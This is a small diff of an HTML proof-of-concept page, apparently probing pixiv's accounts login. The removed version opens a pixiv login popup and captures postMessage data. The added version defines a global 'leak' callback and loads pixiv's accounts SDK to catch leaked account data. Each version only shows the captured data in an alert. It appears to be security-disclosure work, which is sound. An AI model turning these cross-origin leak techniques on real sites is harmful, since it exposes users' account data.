@@ -3,14 +3,11 @@
 <body>
 
 <script>
-  function listener(event) {
-    alert(JSON.stringify(event.data));
-  }
-
-  var dest = window.open("https://accounts.pixiv.net/popup.html#https://booth.pm/users/sign_in");
-
-  window.addEventListener("message", listener);
+   leak = function (stuff) {
+   alert(JSON.stringify(stuff));
+   };  
 </script>
+<script src="http://s.pximg.net/common/accounts-sdk/sdk.1.0.1.js?201605111800" type="text/javascript"></script>
 
 </body>
 </html>
